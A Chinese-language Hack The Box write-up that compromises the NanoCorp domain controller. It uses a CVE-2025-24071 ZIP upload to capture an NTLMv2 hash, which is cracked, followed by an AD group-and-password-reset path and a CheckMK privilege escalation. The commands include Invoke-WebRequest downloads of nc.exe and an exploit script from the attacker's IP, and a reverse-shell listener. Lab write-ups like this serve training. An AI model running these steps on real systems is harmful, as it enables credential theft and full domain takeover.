---
title: HTB NanoCorp 靶场 Writeup
date: 2026-08-30 22:00:00
categories:
  - 靶场
tags:
  - HTB
  - NanoCorp
  - 靶场
description: HTB NanoCorp 靶场 Writeup
---

## nmap

```
nmap -Pn -sT 10.129.243.199 -A
```

```
┌──(echoin㉿kali)-[~]
└─$ nmap -sV -sT 10.129.13.164 -A
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-03 19:21 CST
Nmap scan report for nanocorp.htb (10.129.13.164)
Host is up (0.43s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
80/tcp   open  http              Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
|_http-title: Nanocorp
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-04-03 18:21:59Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
5986/tcp open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.nanocorp.htb
| Subject Alternative Name: DNS:dc01.nanocorp.htb
| Not valid before: 2025-04-06T22:58:43
|_Not valid after:  2026-04-06T23:18:43
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-04-03T18:22:42
|_  start_date: N/A
|_clock-skew: 6h59m59s

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   443.28 ms 10.10.14.1
2   443.37 ms nanocorp.htb (10.129.13.164)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 119.20 seconds
```

1. 主机名:  dc01.nanocorp.htb
2. 域名：nanocorp.htb0.
3. 协议：kerberos （88），ldap（389,3268）
4. API: ssl(5986)
5. AD： Microsoft Windows Active Directory
6. OS: Microsoft Windows 2022|2012|2016
6. 这个靶机像是域控


补充：

![image-20260403193529507](/img/htb/htb-nanocorp-001.png)

- `smb2-security-mode`，说明 SMB 签名被强制启用

- 这阻止了 SMB 中继攻击，以下攻击不行
  
  - SMB 中继攻击
  - NTLM 中继攻击
  
  但是可以诱导出站认证、抓取 NetNTLMv2 再离线破解

**时间同步问题**

```bash
_clock-skew: 6h59m56s
```

时间偏差近 7 小时

用 ntpdate 同步 DC 时间

```
sudo ntpdate dc01.nanocorp.htb
```

ip写入主机：

```
echo "10.129.22.50 nanocorp.htb dc01.nanocorp.htb" >> /etc/hosts
```

访问

![image-20260403191204893](/img/htb/htb-nanocorp-002.png)

扫目录无果，fuzz子域名

```
ffuf -c -u 'http://10.129.13.164/' -H 'Host: FUZZ.nanocorp.htb' -w ~/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -mc all
```

```
feroxbuster -u http://10.129.13.164 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.nanocorp.htb" --filter-status 404 -t 50 -o ferox-subdomains.txt
```

找到一个hire.nanocorp.htb的子域名

```
echo "10.129.13.164 nanocorp.htb hire.nanocorp.htb" >> /etc/hosts
```

访问http://hire.nanocorp.htb/是一个简历提交平台，可以文件上传，要上传zip

![image-20260403201858858](/img/htb/htb-nanocorp-003.png)

找cve

## CVE-2025-24071

CVE-2025-24071是Windows文件资源管理器中的一个欺骗漏洞，利用了Windows对`.library-ms`文件的隐式信任和自动解析特性。攻击者通过构建包含恶意SMB路径的`.library-ms`文件并备份为ZIP/RAR文件，解压时，Windows资源管理器会自动尝试连接到指定的SMB服务器，从而丢失用户的NTLM Hash

https://cti.monster/blog/2025/03/18/CVE-2025-24071.html

https://github.com/0x6rss/CVE-2025-24071_PoC

运行脚本得到exploit.zip

上传文件，触发 Hash 泄露

![image-20260403203120053](/img/htb/htb-nanocorp-004.png)

#### NTLMv2 Hash 窃取攻击

> 怎么想到的：
>
> 这个靶机的SMB2开着，说明可以诱导出站认证、抓取 NetNTLMv2 再离线破解。
>
> 利用Windows 在处理某些文件格式时，会去解析里面的 UNC 路径并发起认证，从而在验证过程中拿到NTLM v2 hash。
>
> **文件处理很可能发生在 Windows Explorer/人工审核链路里**：这就该联想到 `.library-ms`、`.lnk`、`.url`、`.scf`、UNC 之类的“**强制认证**”思路。这个cve用的就是 `.library-ms`。
>
> 为什么要设置smb2监听，能拿到什么：
>
> 设置 SMB2 监听，是为了拿到目标主机的一份 NetNTLMv2 认证，能拿到NetNTLMv2 挑战响应、用户名、域名、工作站名等，后续优先离线破解；若环境允许且签名没强制，再考虑 relay



设置 SMB 监听器

```bash
sudo responder -I tun0 -v
```

通过网站上传 ZIP 文件后，Responder 成功捕获 NTLM v2 Hash：

![image-20260403203416783](/img/htb/htb-nanocorp-005.png)

```
web_svc::NANOCORP:5de3a362c4704cc3:F57364639DC3F87D9F774544FACECD64:01010000000000008051591BA9C3DC011F55A9B1A5785E180000000002000800580050005100310001001E00570049004E002D0052004A004F005A0041004B005A00560030003300370004003400570049004E002D0052004A004F005A0041004B005A0056003000330037002E0058005000510031002E004C004F00430041004C000300140058005000510031002E004C004F00430041004C000500140058005000510031002E004C004F00430041004C00070008008051591BA9C3DC0106000400020000000800300030000000000000000000000000200000CC27C82FCAC1A75D66C5CA0405F415A0E0792C955F00A0B9233D96B9B409F61B0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100350030000000000000000000
```

## Hash 破解

使用hashcat 破解

```
echo "web_svc::NANOCORP:418ff012261526d2:2123EE767320509AEDA1CBBDC85E913D:0101000000000000802C34C2F9C5DC01685FBBCA4C6567A20000000002000800500053004200410001001E00570049004E002D005700530041005600350034004B00300045004B00500004003400570049004E002D005700530041005600350034004B00300045004B0050002E0050005300420041002E004C004F00430041004C000300140050005300420041002E004C004F00430041004C000500140050005300420041002E004C004F00430041004C0007000800802C34C2F9C5DC0106000400020000000800300030000000000000000000000000200000DC816253D57FB1513CFE0D8B13F40EEBA3ABCBCA08FAD7375636ADA73A592F9D0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310037002E003100370037000000000000000000" > websvc_hash.txt
```

```
hashcat -m 5600 websvc_hash.txt /usr/share/wordlists/rockyou.txt
```

得到明文密码： dksehdgh712!@#

## 凭证验证

[域渗透神器 NetExec (nxc) 使用指南-CSDN博客](https://blog.csdn.net/2301_79518550/article/details/147592119)

```bash
nxc smb 10.129.243.199 -u 'web_svc' -p 'dksehdgh712!@#'
```

> （现在拿到了一个**域内用户 `web_svc` 的凭据**，但还没有拿到它的 shell；它**虽然是域用户，但没有被授予可直接通过 WinRM 建立远程会话的权限**，所以不能一上来就直接 WinRM 登录，所以要横向移动到一个有WinRM 链接权限的用户进行拿shell）
>

![image-20260403204145771](/img/htb/htb-nanocorp-006.png)

## bloodhound工具

[【免费下载】 BloodHound.py 使用教程-CSDN博客](https://blog.csdn.net/gitblog_00797/article/details/142076858)

[BloodHound项目中的SharpHound数据收集工具详解-CSDN博客](https://blog.csdn.net/gitblog_01086/article/details/148416224)

可视化分析：[内网信息收集-BloodHound分析域环境 - Yuy0ung - 博客园](https://www.cnblogs.com/yuy0ung/articles/18411240)

- **BloodHound = 看图分析**
-  **SharpHound / BloodHound.py = 采集数据**
-  **Impacket = 干活的协议工具箱**

1. **刚进内网 / 刚拿到域账号**：常先用 **Impacket** 做协议层探测、认证验证、连 SMB/LDAP/RPC 之类。
2. **开始做 AD 枚举**：优先上 **SharpHound**；如果你在 Linux/Kali 上操作，常用 **BloodHound.py / bloodhound-python** 这类 Python 采集器。
3. **把结果导入后分析攻击路径**：用 **bloodhound**。
4. **找到可利用路径后去落地利用、横向、提权**：又回到 **Impacket** 这类实际执行工具

#### 域内信息收集

参数说明：

- `-u`：用户名
- `-p`：密码
- `-d`：域名
- `-ns`：DNS 服务器
- `-c`：收集的数据类型（例如 `All` 表示收集所有数据）

```
bloodhound-python  -u 'web_svc' -p 'dksehdgh712!@#' -k -d nanocorp.htb -ns 10.129.243.199 -c All --zip
```

#### 生成域内信息zip压缩包

然后kali打开bloodhound

- Neo4j的用户名是：neo4j,密码：P@ssword.com123！
- bloodhound的用户名：admin，密码：admin

上传生成的zip,左上角搜索web_svc，右上角选择节点

#### 分析拓图谱

![image-20260403213857445](/img/htb/htb-nanocorp-007.png)

查看web_svc账户，它对IT_SUPPORT组具有AddSelf（添加自定义权限）权限

![image-20260403214238184](/img/htb/htb-nanocorp-008.png)

IT_SUPPORT组对MONITORING_SVC账户具有ForceChangePassword（强制更改密码）权限

![image-20260403214549936](/img/htb/htb-nanocorp-009.png)

（思考：这个bloodhound拓扑图该怎么看，都是什么东西，之间都有什么关系，怎么利用，攻击思路应该怎么找？？？）

<img src="https://i-blog.csdnimg.cn/direct/6a1c754eca4f4eec96ee12ff5457e419.png" alt="img" style="zoom:150%;" />

#### **攻击路径：**

- 利用`WEB_SVC`→通过`IT_SUPPORT`组权限→重置`MONITORING_SVC`密码→接管`MONITORING_SVC`

1. 已经控制了 `WEB_SVC`
2. `WEB_SVC` 属于 `IT_SUPPORT` 组
3. `IT_SUPPORT` 组对 `MONITORING_SVC` 有 **ForceChangePassword** 权限
4. 所以不需要旧密码**，直接把 `MONITORING_SVC` 的密码改掉
5. 改完以后就接管了 `MONITORING_SVC` 账号**

## 横向移动

#### Kerberos 时间同步

> Kerberos 协议要求客户端与服务器 时间差不超过 5 分钟，以防止重放攻击

```
sudo ntpdate 10.129.243.199
```

#### 使用 `web_svc` 申请 TGT

先用已知凭据向 KDC 申请 `web_svc` 的 Kerberos TGT

```
impacket-getTGT nanocorp.htb/'web_svc':'dksehdgh712!@#'
```

这一步执行成功后，当前目录下会生成 `web_svc.ccache`（Kerberos 票据缓存文件）

接着指定当前 shell 使用这张票据：

```
export KRB5CCNAME=$(pwd)/web_svc.ccache
```

`KRB5CCNAME` 表示当前要使用的 Kerberos 凭据缓存文件。
 这里指定的是 `web_svc.ccache`，所以后续带 `-k` 的命令都会以 **web_svc 的 Kerberos 身份** 执行。

可以先确认一下：

```
klist //查看当前 Kerberos 票据缓存里的内容
```

#### 将 `web_svc` 加入 `IT_SUPPORT`

```
bloodyAD -k --host dc01.nanocorp.htb -d nanocorp.htb add groupMember IT_SUPPORT web_svc
```

这一步的作用是把 `web_svc` 加入 `IT_SUPPORT` 组，从而获得后续对 `MONITORING_SVC` 的控制能力。

#### 重置 `MONITORING_SVC` 的密码

在 `web_svc` 已经具备对应权限后，可以直接重置 `MONITORING_SVC` 的密码：

```
bloodyAD -k --host dc01.nanocorp.htb -d nanocorp.htb set password MONITORING_SVC 'Abc123456@'
```

如果这一步成功，说明 `MONITORING_SVC` 的新密码已经被设置为 `Abc123456@`

#### 申请 `MONITORING_SVC` 的 Kerberos 票据

为了避免仍然沿用 `web_svc` 的缓存，先清理当前环境变量：

```
unset KRB5CCNAME
```

然后以新密码为 `MONITORING_SVC` 申请 TGT：

```
kinit MONITORING_SVC@NANOCORP.HTB
```

输入刚刚设置的新密码：

```
Abc123456@
```

再确认当前票据是否已经切换为 `MONITORING_SVC`：

```
klist
```

如果成功，应该能看到类似：

```
Default principal: MONITORING_SVC@NANOCORP.HTB
```

#### 使用 WinRM 登录

先把 `MONITORING_SVC` 的票据显式指定出来：

```
export KRB5CCNAME=FILE:/home/echoin/桌面/MONITORING_SVC.ccache
```

然后使用evil-winrm连接 WinRM：

```
evil-winrm -i dc01.nanocorp.htb -r NANOCORP.HTB -S
```

注意：

> 这里使用WinRM，是因为目标主机开了 WinRM，且是 5986
>
> nmap里最关键的是这行：
>
> ```
> 5986/tcp open  ssl/http  Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
> ```
>
> 这基本就说明：
>
> - **5986 端口开放**
> - 跑的是 **HTTP over SSL/TLS**
> - 这是 **WinRM over HTTPS** 的典型端口
>

拿flag1 

![image-20260410142532191](/img/htb/htb-nanocorp-010.png)

![image-20260410142526428](/img/htb/htb-nanocorp-011.png)

```
9268b3fdea83629fae1a28d5a25b56d1
```

## 提权

#### 用户与组信息收集：

> 本地用户：net user（列出本地用户）；net user 用户名（查看指定用户详情，含描述可能泄露密码）。
> 本地管理员组：net localgroup administrators（找高权限用户）。
> 域用户（需域内权限）：net user /domain（列出所有域用户）；net user 用户名 /domain（域用户详情）。
> 域管理员组：net group "Domain Admins" /domain（核心目标，获取域管列表）。

- 现在所在用户：monitoring_svc

- 所在域：nanocorp

- 用户权限：user

- 域管理员：Administrator

- 域用户：Administrator，Guest，krbtgt，monitoring_svc，web_svc

  - `Administrator`：域高权限账号

  - `krbtgt`：Kerberos 关键账户

  - `monitoring_svc`：当前已经拿到 shell 的账号

  - `web_svc`：前面利用链里拿到的服务账号

- 查找系统漏洞：

  ```
  systeminfo
  ```

  但是**当前这个 WinRM 会话里的 `monitoring_svc` 没有权限执行 `systeminfo.exe`**，或者该程序被策略拦了

看一下靶机上运行着什么服务，找漏洞：

#### 查看进程

```
Get-Process
```

![image-20260410142519031](/img/htb/htb-nanocorp-012.png)

**新发现：**

- check_mk_agent - Check MK监控代理
- cmk-agent-ctl- Check MK代理控制服务

#### CVE-2024-0670 

在2.2.0p23、2.1.0p40和2.0.0（EOL）之前，Checkmk中Windows代理插件的权限升级允许本地用户升级权限

poc:[elsevar11/CVE-2024-0670-CheckMK-Agent-Local-Privilege-Escalation-Exploit：本仓库包含针对 CVE-2024-0670 的漏洞演示，该漏洞是影响 Windows 版 CheckMK Agent 的本地权限提升漏洞。该漏洞允许低权限用户通过滥用MSI修复机制处理的可写文件路径来获得SYSTEM权限。](https://github.com/elsevar11/CVE-2024-0670-CheckMK-Agent-Local-Privilege-Escalation-Exploit)

在目标上下载工具

```
Invoke-WebRequest -Uri "http://10.10.17.177:8000/RunasCs.exe" -OutFile "C:\Windows\Temp\RunasCs.exe"
Invoke-WebRequest -Uri "http://10.10.17.177:8000/nc.exe" -OutFile "C:\Windows\Temp\nc.exe"
Invoke-WebRequest -Uri "http://10.10.17.177:8000/exploit.ps1" -OutFile "C:\Windows\Temp\exploit.ps1
```

监听：

```
nc -lvnp 1111
```

运行

```
.\RunasCs.exe username "password" "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\exploit.ps1"
```

获得 SYSTEM 反向 shell











